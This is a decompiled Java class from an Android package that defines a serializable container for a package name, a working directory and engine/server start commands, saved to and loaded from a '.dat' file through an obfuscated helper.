package com.vvt.polymorphic;

import com.vvt.io.q;
import java.io.Serializable;

public class AppContainerInfo
  implements Serializable
{
  public static final String PERSIST_FILENAME = "app_container_info.dat";
  private static final long serialVersionUID = -185977673212086902L;
  private String commandStartEngine;
  private String commandStartServer;
  private String packageName;
  private String workingDirectory;
  
  public String getCommandStartEngine()
  {
    return this.commandStartEngine;
  }
  
  public String getCommandStartServer()
  {
    return this.commandStartServer;
  }
  
  public String getPackageName()
  {
    return this.packageName;
  }
  
  public String getWorkingDirectory()
  {
    return this.workingDirectory;
  }
  
  public void load(String paramString)
  {
    Object localObject1 = new Object[2];
    localObject1[0] = paramString;
    int i = 1;
    String str = "app_container_info.dat";
    localObject1[i] = str;
    localObject1 = q.a(String.format("%s/%s", (Object[])localObject1));
    Object localObject2 = localObject1;
    localObject2 = (AppContainerInfo)localObject1;
    boolean bool = localObject1 instanceof AppContainerInfo;
    if (bool)
    {
      localObject1 = ((AppContainerInfo)localObject2).getPackageName();
      this.packageName = ((String)localObject1);
      localObject1 = ((AppContainerInfo)localObject2).getWorkingDirectory();
      this.workingDirectory = ((String)localObject1);
      localObject1 = ((AppContainerInfo)localObject2).getCommandStartEngine();
      this.commandStartEngine = ((String)localObject1);
      localObject2 = ((AppContainerInfo)localObject2).getCommandStartServer();
      this.commandStartServer = ((String)localObject2);
    }
  }
  
  public void save(String paramString)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString;
    arrayOfObject[1] = "app_container_info.dat";
    String str = String.format("%s/%s", arrayOfObject);
    q.a(this, str);
  }
  
  public void setCommandStartEngine(String paramString)
  {
    this.commandStartEngine = paramString;
  }
  
  public void setCommandStartServer(String paramString)
  {
    this.commandStartServer = paramString;
  }
  
  public void setPackageName(String paramString)
  {
    this.packageName = paramString;
  }
  
  public void setWorkingDirectory(String paramString)
  {
    this.workingDirectory = paramString;
  }
  
  public String toString()
  {
    Object[] arrayOfObject = new Object[3];
    String str = this.packageName;
    arrayOfObject[0] = str;
    str = this.workingDirectory;
    arrayOfObject[1] = str;
    str = this.commandStartServer;
    arrayOfObject[2] = str;
    return String.format("pkg=%s, dir=%s, cmd=%s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/polymorphic/AppContainerInfo.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */